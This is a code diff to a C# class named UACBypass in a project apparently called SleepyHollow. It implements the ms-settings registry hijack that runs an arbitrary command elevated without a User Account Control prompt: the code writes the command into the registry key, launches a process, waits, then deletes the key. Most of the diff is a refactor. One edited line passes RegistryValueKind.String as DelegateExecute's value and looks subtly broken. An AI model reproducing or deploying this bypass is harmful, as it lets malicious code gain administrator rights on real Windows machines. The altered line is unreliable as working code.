@@ -1,4 +1,5 @@
 using System.Diagnostics;
+using Microsoft.Win32;
 
 namespace SleepyHollow;
 
@@ -12,17 +13,13 @@ internal static class UACBypass
             return;
         }
 
-        Microsoft
-            .Win32.Registry.CurrentUser.CreateSubKey(
-                "Software\\Classes\\ms-settings\\shell\\open\\command"
-            )
+        Registry
+            .CurrentUser.CreateSubKey("Software\\Classes\\ms-settings\\shell\\open\\command")
             .SetValue("", command);
 
-        Microsoft
-            .Win32.Registry.CurrentUser.CreateSubKey(
-                "Software\\Classes\\ms-settings\\shell\\open\\command"
-            )
-            .SetValue("DelegateExecute", "");        
+        Registry
+            .CurrentUser.CreateSubKey("Software\\Classes\\ms-settings\\shell\\open\\command")
+            .SetValue("DelegateExecute", RegistryValueKind.String);
         Process.Start(
             new ProcessStartInfo()
             {
@@ -31,7 +28,7 @@ internal static class UACBypass
             }
         );
         Task.Delay(5000).Wait();
-        Microsoft.Win32.Registry.CurrentUser.DeleteSubKeyTree(
+        Registry.CurrentUser.DeleteSubKeyTree(
             "Software\\Classes\\ms-settings\\shell\\open\\command"
         );
     }
